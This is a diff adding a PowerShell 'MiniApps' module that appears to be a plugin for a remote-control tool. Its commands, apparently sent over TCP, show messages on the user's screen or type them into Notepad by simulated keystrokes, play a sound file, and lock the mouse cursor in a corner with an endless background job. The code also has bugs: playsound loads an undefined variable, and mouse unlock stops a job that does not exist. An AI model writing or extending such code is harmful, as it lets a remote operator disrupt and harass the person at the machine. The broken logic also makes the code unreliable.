@@ -1,0 +1,68 @@
+﻿#MiniApps
+#1.0
+#@{"message" = "[box/notepad] displays your message", "playsound" = "[FileName] plays a wav hidden" , "mouse" = [pos, lock, unlock]}
+#""
+
+function message ($style, $message, [switch]$slow)
+{
+	$message = $message.Replace("~", " ")
+	
+	if ($style -eq "box")
+	{
+		msg $env:USERNAME $message
+		WriteTCPMessage "`nMessage Sent!`n"
+	}
+	if ($style -eq "notepad")
+	{
+		
+		notepad
+		Start-Sleep -Seconds 1
+		if ($slow)
+		{
+			foreach ($letter in $message.ToCharArray())
+			{
+				(New-Object -ComObject WScript.Shell).SendKeys($letter)
+				Start-Sleep -Milliseconds 500
+			}
+		}
+        else { (New-Object -ComObject WScript.Shell).SendKeys($message) }
+		WriteTCPMessage "`nMessage Sent!`n"
+	}
+	if ($style -notin @("box", "notepad")) { WriteTCPMessage "`nInvalid Command!`n" }
+	
+	Remove-Variable style, message, slow -ErrorAction SilentlyContinue
+}
+
+function playsound ($file)
+{
+	$file = $file.Replace("~", " ")
+	$file = (Get-Item $file).FullName
+	$player = New-Object System.Media.SoundPlayer
+	
+	$player.Load($FileName)
+	$player.Play()
+	
+	Remove-Variable file, player -ErrorAction SilentlyContinue
+}
+
+function mouse ($argument)
+{
+	Add-Type -AssemblyName System.Windows.Forms
+	
+	if ($argument -eq "lock")
+	{
+		$process = Start-Job -ScriptBlock { while ($true) { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = @{ x = 0; y = 0 } } }
+		WriteTCPMessage "`nMouse Locked!`n"
+	}
+	if ($argument -eq "unlock")
+	{
+		if ($process.State -eq "Running")
+		{
+			Stop-Job $job
+			WriteTCPMessage "`nMouse Unlocked!`n"
+		}
+		else { WriteTCPMessage "`nMouse Is Not Locked!`n"}
+	}
+	
+	Remove-Variable argument, process -ErrorAction SilentlyContinue
+}
